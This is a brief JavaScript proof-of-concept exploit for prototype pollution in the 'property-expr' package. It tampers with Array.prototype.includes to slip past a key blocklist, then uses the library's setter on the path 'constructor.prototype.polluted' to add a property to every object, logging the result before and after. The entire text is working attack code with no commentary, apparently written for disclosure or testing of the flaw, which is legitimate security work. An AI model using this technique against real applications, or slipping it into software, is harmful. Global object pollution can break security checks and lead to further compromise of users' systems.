Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
let expr = require('property-expr');
obj = {};
console.log({}.polluted);
expr.setter('constructor.prototype.polluted')(obj, 'yes');
console.log({}.polluted);